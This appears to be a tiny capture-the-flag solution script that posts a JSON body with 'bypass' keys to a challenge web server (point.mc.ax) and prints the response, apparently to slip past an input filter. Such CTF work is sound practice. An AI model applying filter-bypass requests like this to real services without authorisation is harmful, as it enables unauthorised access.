import requests

URL = "https://point.mc.ax/"
# URL = "http://localhost:8081"

bypass1 = "What_point"
bypass2 = "that_point"
bypassjson = {bypass1: bypass2}
req = requests.post(url=URL, json=bypassjson)
print(req.text)